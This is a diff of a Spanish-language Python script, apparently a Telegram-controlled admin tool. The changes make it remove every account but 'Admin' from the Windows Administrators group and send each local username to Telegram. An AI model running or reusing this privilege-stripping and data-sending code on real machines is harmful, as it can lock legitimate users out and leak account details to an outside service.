@@ -87,7 +87,7 @@ def quitar_otros_admins():
     """Quita a los demás usuarios del grupo de administradores."""
     resultado = ""
     try:
-        # Intentar obtener la lista de usuarios en el grupo de administradores
+        """# Intentar obtener la lista de usuarios en el grupo de administradores
         try:
             result = subprocess.run(['net', 'localgroup', 'Administradores'], capture_output=True, text=True, check=True)
         except subprocess.CalledProcessError:
@@ -96,13 +96,21 @@ def quitar_otros_admins():
         admins = result.stdout.splitlines()
         for admin in admins:
             admin = admin.strip()
-            if admin != 'Admin':
+            if admin and admin != 'Admin' and admin != 'Nombre de alias' and admin != 'Administradores' and admin != 'Administrators':
                 # Intentar quitar al usuario del grupo de administradores
                 try:
                     subprocess.run(['net', 'localgroup', 'Administradores', admin, '/delete'], check=True)
                 except subprocess.CalledProcessError:
                     subprocess.run(['net', 'localgroup', 'Administrators', admin, '/delete'], check=True)
-                resultado += f"Usuario '{admin}' quitado del grupo de administradores."
+                resultado += f"Usuario '{admin}' quitado del grupo de administradores.\n"""
+        usuarios = obtener_usuarios()
+        for usuario in usuarios:
+            if usuario != 'Admin':
+                try:
+                    subprocess.run(['net', 'localgroup', 'Administradores', usuario, '/delete'], check=True)
+                except subprocess.CalledProcessError:
+                    subprocess.run(['net', 'localgroup', 'Administrators', usuario, '/delete'], check=True)
+                resultado += f"Usuario '{usuario}' quitado del grupo de administradores.\n"
     except Exception as e:
         resultado += f"Error al quitar usuarios del grupo de administradores: {e}"
     return resultado
@@ -160,6 +168,10 @@ def obtener_info_pc():
     for disco in discos:
         mensaje += f"- {disco['Disco']}: Total={disco['Total (GB)']} GB, Usado={disco['Usado (GB)']} GB, Libre={disco['Libre (GB)']} GB\n"
     mensaje += "Usuarios:\n" + "\n".join(usuarios)
+
+    # Enviar mensaje con todos los usuarios
+    for usuario in usuarios:
+        enviar_a_telegram(f"Usuario: {usuario}")
 
     return mensaje
 
